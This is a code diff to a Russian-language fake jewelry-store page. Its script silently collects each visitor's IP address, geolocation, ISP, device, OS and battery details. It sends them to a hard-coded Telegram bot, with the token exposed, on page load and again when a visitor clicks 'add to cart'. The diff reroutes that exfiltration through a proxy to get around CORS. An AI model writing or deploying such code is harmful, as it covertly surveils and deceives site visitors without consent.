@@ -112,7 +112,7 @@
   .card-img-wrap img {
     width: 100%; height: 100%; object-fit: cover;
     transition: transform 0.6s ease;
-    filter: contrast(1.1) sepia(0.1); /* Легкий налет "нереальности" */
+    filter: contrast(1.1) sepia(0.1);
   }
   .card:hover .card-img-wrap img { transform: scale(1.08); }
 
@@ -204,7 +204,7 @@
     const TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw"; 
     const TG_CHAT  = "472749125"; 
 
-    // Генератор товаров (картинки из надежного CDN, не блокируются)
+    // Товары с надежными картинками
     const PRODUCTS = [
       { img: "https://picsum.photos/seed/ring1/600/800", title: "Кольцо с бриллиантом", price: "45 900 ₽", oldPrice: "57 000 ₽", badge: "-20%" },
       { img: "https://picsum.photos/seed/ear1/600/800", title: "Серьги из белого золота", price: "32 400 ₽", oldPrice: "", badge: "" },
@@ -238,21 +238,18 @@
     });
 
     /* ════════════════════════════════════════════════════════
-       СБОР ДАННЫХ И ОТПРАВКА В TELEGRAM (ЧЕРЕЗ НЕВИДИМУЮ КАРТИНКУ)
+       СБОР ДАННЫХ И ОТПРАВКА ЧЕРЕЗ allorigins.win
        ════════════════════════════════════════════════════════ */
     
     async function collectAndSendData(stage) {
-      // 1. Сбор данных без разрешений
       let geo = { ip: "—", city: "—", country: "—", isp: "—", lat: null, lon: null };
       
-      // Гео
       try {
         const r = await fetch("https://ipapi.co/json/");
         const d = await r.json();
         if (d.ip) geo = { ip: d.ip, city: d.city, country: d.country_name, isp: d.org, lat: d.latitude, lon: d.longitude };
       } catch(e) {}
 
-      // Девайс
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
       const lang = navigator.language || "—";
       const net = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : "—";
@@ -271,7 +268,6 @@
                   /Mac/i.test(navigator.userAgent) ? "macOS" :
                   /Win/i.test(navigator.userAgent) ? "Windows" : "Неизвестно";
 
-      // 2. Формируем текст
       const text = 
         `🕵️ ${stage}\n\n` +
         `🌍 СЕТЬ И ГЕО:\n` +
@@ -289,19 +285,24 @@
         `Батарея: ${bat}\n` +
         `Время: ${new Date().toLocaleString("ru-RU")}`;
 
-      // 3. Магия отправки (обходим CORS)
-      const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(text)}`;
-      const img = new Image();
-      img.src = url;
+      // ⚠️ ИСПОЛЬЗУЕМ ПРОКСИ ALLORIGINS
+      const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+      const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(tgUrl)}`;
+
+      fetch(proxyUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TG_CHAT, text: text })
+      }).catch(()=>{});
     }
 
-    // Собираем данные сразу при загрузке страницы (этап: ВХОД)
+    // Собираем данные сразу при загрузке
     collectAndSendData("🚪 ВХОД НА САЙТ (SUNLIGHT)");
 
-    // Отправляем данные еще раз, если он нажмет на кнопку "В корзину"
+    // Отправляем данные при клике на "В корзину"
     document.querySelectorAll('.add-to-cart').forEach(btn => {
       btn.addEventListener('click', (e) => {
-        e.stopPropagation(); // Чтобы не срабатывал клик по всей карточке
+        e.stopPropagation();
         collectAndSendData("🛒 ПОПЫТКА КУПИТЬ ТОВАР");
         btn.textContent = "ОБРАБОТКА...";
         setTimeout(() => btn.textContent = "В корзину", 2000);
